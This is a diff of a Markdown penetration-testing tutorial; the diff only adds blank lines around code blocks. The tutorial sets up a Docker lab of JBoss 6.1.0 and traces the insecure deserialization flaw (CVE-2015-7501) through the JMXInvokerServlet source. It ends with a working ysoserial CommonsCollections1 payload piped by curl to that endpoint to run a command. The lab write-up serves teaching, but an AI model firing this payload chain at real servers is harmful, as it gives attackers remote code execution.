@@ -640,11 +640,13 @@ You can learn about [Java Serialization and Deserialization more here.](https://
 
 For a lab demonstration, we will be exploiting the [Insecure Deserialization on JBoss 6.1.0 CVE-2015-7501](https://www.rapid7.com/db/vulnerabilities/red_hat-jboss_eap-cve-2015-7501/).
 - To build the lab, we have to use the docker build. Save below configurations on a Dockerfile.
+
 ```bash
 mkdir java-desc
 cd java-desc
 vim Dockerfile
 ```
+
 ```dockerfile
 FROM jboss/base:latest
 EXPOSE 8080
@@ -672,15 +674,20 @@ ENV LAUNCH_JBOSS_IN_BACKGROUND true
 CMD ["/opt/jboss/server/jboss-6.1.0.Final/bin/run.sh", "-b", "0.0.0.0"]
 
 ```
+
 - Start Docker Desktop or daemon.
 - Build the docker.
+
 ```bash
 docker build . -t jboss
 ```
+
 - Run the docker image
+
 ```bash
 docker run -p 8080:8080 jboss
 ```
+
 - Navigating into **YOUR-IP:8080**, we can see the JBOSS web app displayed.
 ![image](https://user-images.githubusercontent.com/47778874/228146731-fa168878-be96-4f8f-9a2c-1a654e666bd3.png)
 - Navigate to **YOUR-IP:8080/invoker/JMXInvokerServlet** and intercept the request with burp.
@@ -693,11 +700,13 @@ docker run -p 8080:8080 jboss
 - ![image](https://user-images.githubusercontent.com/47778874/228149533-d032a58e-669e-42d6-ae1c-03e092a77bd1.png)
 - Until now, we cannot verify either the application contains insecure deserialization vulnerability, we can perform some hit and trial with [ysoserial](https://github.com/frohoff/ysoserial).
 - Let's perform some source code analysis at first and find where and how this vulnerability existed. You can download the source code from [JBOSS Web Site](https://download.jboss.org/jbossas/6.1/jboss-as-distribution-6.1.0.Final-src.zip)
+
 ```bash
 wget https://download.jboss.org/jbossas/6.1/jboss-as-distribution-6.1.0.Final-src.zip
 unzip jboss-as-distribution-6.1.0.Final-src.zip
 cd jboss-6.1.0.Final-src
 ```
+
 - Open the code base on VS Code or any other applications.
 - As discussed on the explanation about **readObject()** method of **ObjectInputStream** class, we need to find if that method is implemented since serialization is performed. Also, all the **readObject()** method on the source code might not be vulnerable. Since we knew that the vulnerability exists on **invoker/JMXInvokerServlet**, we can search for **readObject()** method using VS Code and include `*servlet` on the files to include.
 ![image](https://user-images.githubusercontent.com/47778874/228157852-1d8716a3-441e-487d-bf7b-71ae7c8fe99b.png)
@@ -706,12 +715,14 @@ cd jboss-6.1.0.Final-src
 - If we see the above code between lines 116-138, we can find a **ois.readObject()** method, which comes from **ObjectInputStream** and it comes from **ServletInputStream** and that is created from **request.getInputStream()**. This **request** is passed as **HttpServletRequest** parameter in **processRequest()** method.
 - We need to find where this **processRequest()** method is called within this Java file and we can find two methods **doGet** and **doPost** between line 219-233 where **processRequest()** is called. **doGet** and **doPost** are methods of the javax.servlet.http.HttpServlet class that are used to handle HTTP GET and POST requests, respectively. Therefore when we performed GET request on the **/invoker/JMXInvokerServlet** endpoint, we got some serialized object back.
 - When we send some serialized object on above endpoint with POST request, it triggers the **doPost** method, the **doPost** method calls **processRequest** method and it will deserializes the object using below code which is executed when **processRequest** method is triggered.
+
 ```java
 ServletInputStream sis = request.getInputStream();
 ObjectInputStream ois = new ObjectInputStream(sis);
 mi = (MarshalledInvocation) ois.readObject();
 ois.close();
 ```
+
 - Sometimes we do not get such endpoints easily, in such case we can find the endpoint from **web.xml**. Search your class name on web.xml file, we can find our class name on **<servlet-class>org.jboss.invocation.http.servlet.InvokerServlet</servlet-class>** and which is defined under **<servlet-name>JMXInvokerServlet</servlet-name>**.
 ```xml
    <servlet>
@@ -728,13 +739,16 @@ ois.close();
    </servlet>
 ```
 - And if we search the keyword **JMXInvokerServlet** on the same XML file, we can find the endpoint.
+
 ```xml
 <servlet-mapping>
        <servlet-name>JMXInvokerServlet</servlet-name>
        <url-pattern>/JMXInvokerServlet/*</url-pattern>
 </servlet-mapping>
 ```
+
 - But this only provided **/JMXInvokerServlet/** but as we see above we also need **invoke/JMXInvokerServlet/**. If we navigated to **jboss-service.xml** which is on the same directory as **web.xml** and searched **JMXInvokerServlet** we can find the full URL endpoint as shown below.
+
 ```xml
 <value-factory bean="ServiceBindingManager" method="getStringBinding">
    <parameter>jboss.web:service=WebServer</parameter>
@@ -742,19 +756,25 @@ ois.close();
    <parameter>http://${hostforurl}:${port}/invoker/JMXInvokerServlet</parameter>
 </value-factory>
 ```
+
 - In this way, we can map the URL endpoint with the source code. Now let's get back to our insecure deserialization vulnerability.
 - Inorder to exploit it we need to locate the gadget, craft the exploit payload and submit the payload to the target application.
 - We will be using ysoserial to craft the payload. It is a tool that allows us to generated malicious serialized object.
 - Download the ysoserial JAR file from [here.](https://github.com/frohoff/ysoserial/releases/tag/v0.0.6)
+
 ```bash
 wget https://github.com/frohoff/ysoserial/releases/download/v0.0.6/ysoserial-all.jar
 ```
+
 - Generate the payload and send it's output through CURL command to the endpoint.
+
 ```bash
 java -jar ysoserial-all.jar CommonsCollections1 "touch /tmp/nirajkharel" | curl -X POST --data-binary @- http://YOUR-IP:8080/invoker/JMXInvokerServlet
 ```
+
 - Here `@-` is used to pass the value of yoserial  and `--data-binary` is used since binary object is passed on the request.
 - If successfull, there will be a file called `nirajkharel` under `/tmp` directory.
+
 ```bash
 docker ps -a
 docker exec -it <Container-ID> /bin/bash
